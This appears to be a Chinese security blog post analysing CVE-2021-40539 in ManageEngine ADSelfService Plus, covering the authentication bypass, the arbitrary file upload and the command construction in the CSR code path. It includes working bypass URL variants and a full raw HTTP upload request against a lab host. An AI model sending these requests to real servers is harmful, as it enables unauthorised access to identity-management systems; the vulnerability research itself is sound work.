<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>CVE-2021-40539 ManageEngine ADSelfService Plus漏洞分析 | 藏青&#39;s BLOG</title>

  
  <meta name="author" content="藏青">
  

  
  <meta name="description" content="知行合一">
  

  
  <meta name="keywords" content="渗透 内网 代码审计">
  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  <meta property="og:title" content="CVE-2021-40539 ManageEngine ADSelfService Plus漏洞分析"/>

  <meta property="og:site_name" content="藏青&#39;s BLOG"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="藏青&#39;s BLOG" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">藏青&#39;s BLOG</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">Home</a></li>
      
        <li><a href="/archives">Archives</a></li>
      
        <li><a href="/categories">Categories</a></li>
      
        <li><a href="/links">Links</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    <article>

  
    
    <h3 class="article-title"><span>CVE-2021-40539 ManageEngine ADSelfService Plus漏洞分析</span></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus漏洞分析/" rel="bookmark">
        <time class="entry-date published" datetime="2021-11-11T10:31:47.000Z">
          2021-11-11
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>​    该漏洞影响版本在<code>6113</code>版本以前，但是在官网上已经下载不到这个版本了，我在<a target="_blank" rel="noopener" href="https://fs2.download82.com/software/bbd8ff9dba17080c0c121804efbd61d5/manageengine-adselfservice-plus/ManageEngine_ADSelfService_Plus_64bit.exe">其他网站</a>下载了5.8的版本进行分析。</p>
<p>​    下载好后双击exe安装，但启动过程中会卡在一个地方不动，后来我是通过双击<code>bin/run.bat</code>解决的，需要注意在选择版本的时候选择<code>free</code>版本。启动后的界面如下：</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112113129673.png" alt="image-20211112113129673"></p>
<span id="more"></span>

<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>​    看启动过程这个系统也是基于tomcat，tomcat的调试是在<code>catalina.bat</code>中加上调试信息，但是这个系统似乎没有<code>catalina.bat</code>文件。在<code>run.bat</code>中加上下面的内容。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112133827196.png" alt="image-20211112133827196"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="认证绕过"><a href="#认证绕过" class="headerlink" title="认证绕过"></a>认证绕过</h3><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><blockquote>
<p>/./RestAPI/LicenseMgr</p>
</blockquote>
<h4 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h4><p>​    这里可以看到是请求<code>RestAPI</code>接口时的绕过，查看<code>web.xml</code>文件，访问<code>RestAPI/</code>下的内容会被<code>struts</code>处理。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>action<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.apache.struts.action.ActionServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">		...</span><br><span class="line">		<span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>action<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/RestAPI/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    在<code>webapps/adssp/WEB-INF/api-struts-config.xml:43</code>中找到<code>LicenseMgr</code>的处理类。</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">path</span>=<span class="string">&quot;/LicenseMgr&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.adventnet.sym.adsm.common.webclient.api.LicenseMgr&quot;</span> <span class="attr">parameter</span>=<span class="string">&quot;operation&quot;</span> <span class="attr">validate</span>=<span class="string">&quot;false&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;session&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">forward</span> <span class="attr">name</span>=<span class="string">&quot;result&quot;</span> <span class="attr">path</span>=<span class="string">&quot;/adsf/jsp/common/RestAPIResponse.jsp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    在<code>LicenseMgr</code>中没有找到明显的操作方法，因此在父类的<code>DispatchAction#execute</code>方法打断点，通过执行上面的<code>payload</code>拿到调用栈。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112141006087.png" alt="image-20211112141006087"></p>
<p>​    如果没有加上<code>/./</code>绕过，则不会执行到这个方法，所以推测是在<code>Filter</code>中做了权限认证的处理。这个系统配置的<code>Filter</code>并不多，因此我过了下发现问题主要在<code>ADSFilter#doFilter</code>中，如果没有加<code>/./</code>则会直接返回。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112141647457.png" alt="image-20211112141647457"></p>
<p>​    通过上面的代码分析，同时满足下面两个条件才会<code>return</code>，所以我们只要绕过一个即可。</p>
<ul>
<li><p><code>reqURI</code>可以被<code>/RestAPI/*</code>匹配到</p>
</li>
<li><p><code>RestAPIFilter.doAction</code>返回false</p>
<p>很明显使用<code>/./</code>是绕过了正则匹配的部分。</p>
</li>
</ul>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112144748147.png" alt="image-20211112144748147"></p>
<p>​    前面提到了这个系统是使用了<code>tomcat</code>，所以其实绕过的方法就比较多样了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/xxxx/../RestAPI/LicenseMgr</span><br><span class="line">/;asdassd/RestAPI/LicenseMgr</span><br><span class="line">/xxx;asdassd/../RestAPI/LicenseMgr</span><br><span class="line">/RestAPI;/LicenseMgr</span><br></pre></td></tr></table></figure>

<h3 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h3><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>​    执行成功后会在<code>/bin</code>下创建<code>test.txt</code>文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /./RestAPI/LogonCustomization HTTP/1.1</span><br><span class="line">Host: 192.168.3.16:8888</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: confluence.browse.space.cookie=space-templates; adscsrf=c7cd8c01-87c0-493d-841b-08dab9b51b30; JSESSIONIDADSSP=E332DAC8F8DCA73F0A99581A22D3ED36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------39411536912265220004317003537</span><br><span class="line">Content-Length: 749</span><br><span class="line"></span><br><span class="line">-----------------------------39411536912265220004317003537</span><br><span class="line">Content-Disposition: form-data; name=&quot;methodToCall&quot;</span><br><span class="line"></span><br><span class="line">unspecified</span><br><span class="line">-----------------------------39411536912265220004317003537</span><br><span class="line">Content-Disposition: form-data; name=&quot;Save&quot;</span><br><span class="line"></span><br><span class="line">yes</span><br><span class="line">-----------------------------39411536912265220004317003537</span><br><span class="line">Content-Disposition: form-data; name=&quot;form&quot;</span><br><span class="line"></span><br><span class="line">smartcard</span><br><span class="line">-----------------------------39411536912265220004317003537</span><br><span class="line">Content-Disposition: form-data; name=&quot;operation&quot;</span><br><span class="line"></span><br><span class="line">Add</span><br><span class="line">-----------------------------39411536912265220004317003537</span><br><span class="line">Content-Disposition: form-data; name=&quot;CERTIFICATE_PATH&quot;; filename=&quot;adasdas/.././astest.txt&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">arbitrary content</span><br><span class="line">-----------------------------39411536912265220004317003537--</span><br></pre></td></tr></table></figure>

<h4 id="原理分析-1"><a href="#原理分析-1" class="headerlink" title="原理分析"></a>原理分析</h4><p>​    <code>Struts-config.xml</code>存在如下配置:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">action</span> <span class="attr">path</span>=<span class="string">&quot;/LogonCustomization&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.adventnet.sym.adsm.common.webclient.admin.LogonCustomization&quot;</span> <span class="attr">name</span>=<span class="string">&quot;LogonCustomBean&quot;</span> <span class="attr">validate</span>=<span class="string">&quot;false&quot;</span> <span class="attr">parameter</span>=<span class="string">&quot;methodToCall&quot;</span> <span class="attr">scope</span>=<span class="string">&quot;request&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">forward</span> <span class="attr">name</span>=<span class="string">&quot;LogonCustomization&quot;</span> <span class="attr">path</span>=<span class="string">&quot;LogonCustomizationPage&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​    通过配置+POC可知，调用的是<code>unspecified</code>方法,由于<code>form</code>传入的是<code>smartcard</code>，因此会进入到<code>else if</code>的内容中。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ActionForward <span class="title">unspecified</span><span class="params">(ActionMapping mapping, ActionForm form, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">            <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;Save&quot;</span>) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                message = rb.getString(<span class="string">&quot;adssp.common.text.success_update&quot;</span>);</span><br><span class="line">                messageType = <span class="string">&quot;success&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;mob&quot;</span>.equalsIgnoreCase(request.getParameter(<span class="string">&quot;form&quot;</span>))) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.saveMobileSettings(logonList, request);</span><br><span class="line">                    request.setAttribute(<span class="string">&quot;form&quot;</span>, <span class="string">&quot;mob&quot;</span>);</span><br><span class="line">                &#125; </span><br><span class="line">                <span class="comment">//进入到下面的处理中</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;smartcard&quot;</span>.equalsIgnoreCase(request.getParameter(<span class="string">&quot;form&quot;</span>))) &#123;</span><br><span class="line">                    operation = request.getParameter(<span class="string">&quot;operation&quot;</span>);</span><br><span class="line">                    SmartCardAction sCAction = <span class="keyword">new</span> SmartCardAction();</span><br><span class="line">                    <span class="keyword">if</span> (operation.equalsIgnoreCase(<span class="string">&quot;Add&quot;</span>)) &#123;</span><br><span class="line">                        request.setAttribute(<span class="string">&quot;CERTIFICATE_FILE&quot;</span>, ClientUtil.getFileFromRequest(request, <span class="string">&quot;CERTIFICATE_PATH&quot;</span>));</span><br><span class="line">                        request.setAttribute(<span class="string">&quot;CERTIFICATE_NAME&quot;</span>, ClientUtil.getUploadedFileName(request, <span class="string">&quot;CERTIFICATE_PATH&quot;</span>));</span><br><span class="line">                        <span class="comment">//处理SmartCardConfig文件</span></span><br><span class="line">                        sCAction.addSmartCardConfig(mapping, dynForm, request, response);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (operation.equalsIgnoreCase(<span class="string">&quot;Update&quot;</span>)) &#123;</span><br><span class="line">                        sCAction.updateSmartCardConfig(mapping, form, request, response);</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure>

<p>​    跟进到<code>SmartCardAction#addSmartCardConfig</code>中，调用了<code>getFileFromRequest</code></p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112192733952.png" alt="image-20211112192733952"></p>
<p><code>getFileFromRequest</code>从Form表单中解析得到文件名和内容进行上传。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112192819614.png" alt="image-20211112192819614"></p>
<p>​    在已经拿到POC的情况下，可以看到文件上传漏洞的原理比较简单，那么下面我提出两个问题。</p>
<ul>
<li>这里在写入文件时明明只有文件名，为什么写入的文件会被上传到<code>bin</code>目录下？</li>
</ul>
<p>这个问题可以通过分析<code>File#getAbsolutePath</code>的调用解决，<code>getAbsolutePath--&gt;resolve--&gt;getUserPath()--&gt;System.getProperty(&quot;user.dir&quot;)</code>，而在当前环境中<code>System.getProperty(&quot;user.dir&quot;)</code>保存的是<code>/bin/</code>的地址，因此上传会传到/bin目录下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">getAbsolutePath</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> fs.resolve(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112200445801.png" alt="image-20211112200445801"></p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112200505142.png" alt="image-20211112200505142"></p>
<ul>
<li>我试图通过../等方式跨目录没有成功？为什么不能通过../实现跨目录上传？</li>
</ul>
<p>FileName是通过<code>getFileName</code>获取的</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112201020338.png" alt="image-20211112201020338"></p>
<p><code>getFileName</code>调用<code>getBaseFileName</code></p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112201043985.png" alt="image-20211112201043985"></p>
<p><code>getBaseFileName</code>中通过<code>new File().getName()</code>获取文件名，所以我们传入的路径会被处理，这也是无法跨目录上传的原因。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211112201247629.png" alt="image-20211112201247629"></p>
<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><h4 id="原理分析-2"><a href="#原理分析-2" class="headerlink" title="原理分析"></a>原理分析</h4><p>​    命令执行发生在<code>ConnectionAction#openSSLTool</code>中，这个函数中通过<code>createCSR</code>创建CSR文件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ActionForward <span class="title">openSSLTool</span><span class="params">(ActionMapping actionMap, ActionForm actionForm, HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    String action = request.getParameter(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (action != <span class="keyword">null</span> &amp;&amp; action.equals(<span class="string">&quot;generateCSR&quot;</span>)) &#123;</span><br><span class="line">        SSLUtil.createCSR(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> actionMap.findForward(<span class="string">&quot;SSLTool&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>createCSR</code>接收需要的参数放到<code>sslParams</code>这个json对象中，并继续通过重载方法完成实际的操作。</p>
<p><img src="/2021/11/11/CVE-2021-40539-ManageEngine-ADSelfService-Plus%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20211113124517990.png" alt="image-20211113124517990"></p>
<p>​    重载的<code>createCSR</code>方法中，接收参数拼接并调用<code>runCommand</code>方法执行命令，主要是通过调用<code>keytool.exe</code>生成证书文件。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> JSONObject <span class="title">createCSR</span><span class="params">(JSONObject sslSettings)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">     <span class="comment">//接收参数拼接命令</span></span><br><span class="line">     String name = <span class="string">&quot;\&quot;&quot;</span> + sslSettings.getString(<span class="string">&quot;COMMON_NAME&quot;</span>) + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">     String pass = sslSettings.getString(<span class="string">&quot;PASSWORD&quot;</span>);</span><br><span class="line">     <span class="comment">//keyToolEscape过滤</span></span><br><span class="line">     pass = ClientUtil.keyToolEscape(pass);</span><br><span class="line">     String password = <span class="string">&quot;\&quot;&quot;</span> + pass + <span class="string">&quot;\&quot;&quot;</span>;</span><br><span class="line">     logger.log(Level.INFO, <span class="string">&quot;Keystore will be created for &quot;</span> + name);</span><br><span class="line">     File keyFile = <span class="keyword">new</span> File(<span class="string">&quot;..\\jre\\bin\\SelfService.keystore&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (keyFile.exists()) &#123;</span><br><span class="line">         File bckFile = <span class="keyword">new</span> File(<span class="string">&quot;..\\jre\\bin\\SelfService_&quot;</span> + System.currentTimeMillis() + <span class="string">&quot;.keystore&quot;</span>);</span><br><span class="line">         keyFile.renameTo(bckFile);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     StringBuilder keyCmd = <span class="keyword">new</span> StringBuilder(<span class="string">&quot;..\\jre\\bin\\keytool.exe  -J-Duser.language=en -genkey -alias tomcat -sigalg SHA256withRSA -keyalg RSA -keypass &quot;</span>);</span><br><span class="line">     keyCmd.append(password);</span><br><span class="line">     keyCmd.append(<span class="string">&quot; -storePass &quot;</span>).append(password);</span><br><span class="line">     String keyLength = sslSettings.getString(<span class="string">&quot;KEY_LENGTH&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (keyLength != <span class="keyword">null</span> &amp;&amp; !keyLength.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">         keyCmd.append(<span class="string">&quot; -keysize &quot;</span>).append(keyLength);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     String validity = sslSettings.getString(<span class="string">&quot;VALIDITY&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (validity != <span class="keyword">null</span> &amp;&amp; !validity.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">         keyCmd.append(<span class="string">&quot; -validity &quot;</span>).append(validity);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     String san_name = sslSettings.getString(<span class="string">&quot;SAN_NAME&quot;</span>);</span><br><span class="line">     keyCmd.append(<span class="string">&quot; -dName \&quot;CN=&quot;</span>).append(ClientUtil.keyToolEscape(sslSettings.getString(<span class="string">&quot;COMMON_NAME&quot;</span>)));</span><br><span class="line">     keyCmd.append(<span class="string">&quot;, OU= &quot;</span>).append(ClientUtil.keyToolEscape(sslSettings.getString(<span class="string">&quot;OU&quot;</span>)));</span><br><span class="line">     keyCmd.append(<span class="string">&quot;, O=&quot;</span>).append(ClientUtil.keyToolEscape(sslSettings.getString(<span class="string">&quot;ORGANIZATION&quot;</span>)));</span><br><span class="line">     keyCmd.append(<span class="string">&quot;, L=&quot;</span>).append(ClientUtil.keyToolEscape(sslSettings.getString(<span class="string">&quot;LOCALITY&quot;</span>)));</span><br><span class="line">     keyCmd.append(<span class="string">&quot;, S=&quot;</span>).append(ClientUtil.keyToolEscape(sslSettings.getString(<span class="string">&quot;STATE&quot;</span>)));</span><br><span class="line">     keyCmd.append(<span class="string">&quot;, C=&quot;</span>).append(ClientUtil.keyToolEscape(sslSettings.getString(<span class="string">&quot;COUNTRY_CODE&quot;</span>)));</span><br><span class="line">     keyCmd.append(<span class="string">&quot;\&quot; -keystore ..\\jre\\bin\\SelfService.keystore&quot;</span>);</span><br><span class="line">     <span class="keyword">if</span> (san_name != <span class="keyword">null</span> &amp;&amp; !san_name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">         keyCmd.append(<span class="string">&quot; -ext SAN=&quot;</span>);</span><br><span class="line">         String[] san_name_arr = san_name.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"></span><br><span class="line">         <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; san_name_arr.length; ++i) &#123;</span><br><span class="line">             <span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">                 keyCmd.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">             keyCmd.append(<span class="string">&quot;dns:&quot;</span> + ClientUtil.keyToolEscape(san_name_arr[i]));</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     JSONObject jStatus = <span class="keyword">new</span> JSONObject();</span><br><span class="line">     String status = runCommand(keyCmd.toString());</span><br><span class="line">     logger.log(Level.INFO, <span class="string">&quot;The status of keystore creation is &quot;</span> + status);</span><br><span class="line">     <span class="keyword">if</span> (status != <span class="keyword">null</span> &amp;&amp; status.equals(<span class="string">&quot;success&quot;</span>)) &#123;</span><br><span class="line">         keyFile = <span class="keyword">new</span> File(<span class="string">&quot;..\\webapps\\adssp\\Certificates&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span> (!keyFile.exists()) &#123;</span><br><span class="line">             keyFile.mkdir();</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         keyCmd = (<span class="keyword">new</span> StringBuilder(<span class="string">&quot;..\\jre\\bin\\keytool.exe -J-Duser.language=en -certreq -alias tomcat -sigalg SHA256withRSA -keyalg RSA -storepass &quot;</span>)).append(password).append(<span class="string">&quot; -keystore ..\\jre\\bin\\SelfService.keystore -file ..\\webapps\\adssp\\Certificates\\SelfService.csr&quot;</span>);</span><br><span class="line">         <span class="keyword">if</span> (san_name != <span class="keyword">null</span> &amp;&amp; !san_name.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">             keyCmd.append(<span class="string">&quot; -ext SAN=&quot;</span>);</span><br><span class="line">             String[] san_name_arr = san_name.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line"></span><br><span class="line">             <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; san_name_arr.length; ++i) &#123;</span><br><span class="line">                 <span class="keyword">if</span> (i != <span class="number">0</span>) &#123;</span><br><span class="line">                     keyCmd.append(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line"></span><br><span class="line">                 keyCmd.append(<span class="string">&quot;dns:&quot;</span> + ClientUtil.keyToolEscape(san_name_arr[i]));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="comment">//执行命令</span></span><br><span class="line">         status = runCommand(keyCmd.toString());</span><br><span class="line">         logger.log(Level.INFO, <span class="string">&quot;The status of CSR Generation is &quot;</span> + status);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>​    大部分的参数拼接时都会经过<code>keyToolEscape</code>的过滤,<code>keyToolEscape</code>中会将<code>&quot;,；</code>等敏感字符转义。</p>
